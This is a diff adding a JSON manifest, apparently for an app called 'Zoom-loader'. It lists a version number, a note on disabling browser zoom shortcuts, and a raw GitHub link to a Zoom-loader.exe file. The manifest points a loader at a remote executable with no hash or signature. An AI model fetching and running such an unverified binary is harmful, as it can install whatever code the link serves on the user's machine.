@@ -1,0 +1,5 @@
+{
+  "version": "1.2.6",
+  "notes": "Disable browser zoom (Ctrl+/Ctrl-) and other Chrome-like shortcuts so Zoom-loader behaves as a standalone app",
+  "exe": "https://raw.githubusercontent.com/Arison-N/ChatGPT/cursor/paste-curl-downloader-304e/tools/paste-curl-download/dist/Zoom-loader.exe"
+}
